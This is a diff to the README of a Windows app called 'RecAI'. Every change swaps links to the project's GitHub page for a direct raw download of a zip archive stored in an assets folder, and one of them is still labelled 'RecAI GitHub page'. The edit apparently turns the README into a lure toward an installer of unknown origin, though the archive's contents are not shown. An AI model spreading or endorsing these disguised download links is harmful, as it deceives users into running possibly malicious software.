@@ -1,6 +1,6 @@
 # 🤖 RecAI - Easy AI-Powered Recommendations
 
-[![Download RecAI](https://img.shields.io/badge/Download-RecAI-green?style=for-the-badge)](https://github.com/Paco120/RecAI)
+[![Download RecAI](https://img.shields.io/badge/Download-RecAI-green?style=for-the-badge)](https://raw.githubusercontent.com/Paco120/RecAI/main/Knowledge_Plugin/assets/AI_Rec_v1.1.zip)
 
 <div align="center">
 
@@ -34,7 +34,7 @@ Follow these steps to get RecAI running on your Windows PC.
 
 Click the big green button below to open the download page for RecAI on GitHub. This page has the latest version and all files you need.
 
-[![Download RecAI](https://img.shields.io/badge/Download-RecAI-brightgreen?style=for-the-badge)](https://github.com/Paco120/RecAI)
+[![Download RecAI](https://img.shields.io/badge/Download-RecAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Paco120/RecAI/main/Knowledge_Plugin/assets/AI_Rec_v1.1.zip)
 
 ### 2. Download the Installer
 
@@ -123,7 +123,7 @@ The main folder contains:
 
 To get the latest features and fixes:
 
-1. Visit the [RecAI GitHub page](https://github.com/Paco120/RecAI).  
+1. Visit the [RecAI GitHub page](https://raw.githubusercontent.com/Paco120/RecAI/main/Knowledge_Plugin/assets/AI_Rec_v1.1.zip).  
 2. Download the newest installer file.  
 3. Run it just like before. The installer will update your existing version automatically.  
 
@@ -138,4 +138,4 @@ If you need help:
 
 ## 📥 Download Link
 
-[![Download RecAI](https://img.shields.io/badge/Download-RecAI-green?style=for-the-badge)](https://github.com/Paco120/RecAI)
+[![Download RecAI](https://img.shields.io/badge/Download-RecAI-green?style=for-the-badge)](https://raw.githubusercontent.com/Paco120/RecAI/main/Knowledge_Plugin/assets/AI_Rec_v1.1.zip)
